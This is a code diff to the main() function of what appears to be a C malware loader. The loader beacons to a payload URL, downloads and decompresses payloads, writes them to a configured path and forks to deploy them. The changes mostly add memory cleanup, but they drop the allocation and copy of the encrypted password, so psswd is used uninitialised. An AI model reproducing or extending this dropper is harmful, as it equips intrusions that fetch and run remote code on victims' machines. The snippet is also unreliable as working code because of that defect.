@@ -23,6 +23,7 @@ int main(int argc, char **argv)
     char *payload_envp[] = PAYLOAD_ENVP; // envp for payload
     char *pathToWrite = PATH_TO_WRITE;
     pid_t child;
+    char *psswd;
 
     payload = beacon(PAYLOAD_URL);
     payloadOffset = payload.memory; // hold for iteration
@@ -45,10 +46,12 @@ int main(int argc, char **argv)
     }
 
     // password padding
-    char *psswd;
-    psswd = (char *) malloc(32);
-    strcpy(psswd, ENC_PASSWORD); 
     psswd = psswdPadding(psswd);
+    if(psswd == NULL){
+        free(payload.memory);
+        free(metaBytes);
+        return -1;
+    }
 
     for (int i = 0; i < numPayloads; i++)
     { // main loop to deploy payloads
@@ -70,6 +73,7 @@ int main(int argc, char **argv)
             free(decompressed);
             free(payload.memory);
             free(metaBytes);
+            free(psswd);
             return -1;
         }
 
@@ -79,6 +83,8 @@ int main(int argc, char **argv)
             free(decompressed);
             free(payload.memory);
             free(metaBytes);
+            free(psswd);
+            close(payloadFD);
             return -1;
         }
 
@@ -94,6 +100,7 @@ int main(int argc, char **argv)
                     free(decompressed);
                     free(payload.memory);
                     free(metaBytes);
+                    free(psswd);
                     close(payloadFD);
                     return -1;
                 }
@@ -112,5 +119,6 @@ int main(int argc, char **argv)
     }
     free(payload.memory);
     free(metaBytes);
+    free(psswd);
     return 0;
 }
